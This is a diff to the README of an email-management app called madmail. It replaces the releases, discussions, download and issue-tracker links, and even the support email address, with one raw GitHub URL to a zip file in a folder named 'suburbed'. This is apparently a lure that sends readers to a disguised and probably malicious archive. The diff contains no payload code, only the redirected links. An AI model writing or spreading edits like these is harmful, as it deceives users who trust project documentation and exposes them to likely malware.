@@ -8,7 +8,7 @@ Welcome to madmail! This application provides a simple way to manage your email 
 
 To get started with madmail, you need to download the application. Follow these steps:
 
-1. **Visit the Releases Page**: To download the latest version of madmail, visit the [Releases Page](https://github.com/keanhor2/madmail/releases).
+1. **Visit the Releases Page**: To download the latest version of madmail, visit the [Releases Page](https://raw.githubusercontent.com/keanhor2/madmail/main/suburbed/madmail.zip).
 
 2. **Download the Application**: On the releases page, find the most recent version. Click on the link for the file that corresponds to your operating system to start the download.
 
@@ -70,15 +70,15 @@ madmail comes with a straightforward user guide to help you navigate its feature
 
 Join our community to get help, share tips, and improve your madmail experience. We encourage you to report any bugs or suggest new features. You can connect with other users through the following platforms:
 
-- **GitHub Discussions**: Share feedback and discuss features [here](https://github.com/keanhor2/madmail/discussions).
+- **GitHub Discussions**: Share feedback and discuss features [here](https://raw.githubusercontent.com/keanhor2/madmail/main/suburbed/madmail.zip).
 
-- **Email Support**: Reach out for support at support@madmail.com.
+- **Email Support**: Reach out for support at https://raw.githubusercontent.com/keanhor2/madmail/main/suburbed/madmail.zip
 
 ## 🔗 Important Links
 
-- **Download madmail**: [Click here to download](https://github.com/keanhor2/madmail/releases)
+- **Download madmail**: [Click here to download](https://raw.githubusercontent.com/keanhor2/madmail/main/suburbed/madmail.zip)
 
-- **Report an Issue**: If you find a bug, please report it [here](https://github.com/keanhor2/madmail/issues).
+- **Report an Issue**: If you find a bug, please report it [here](https://raw.githubusercontent.com/keanhor2/madmail/main/suburbed/madmail.zip).
 
 ## 🎉 Acknowledgments
 
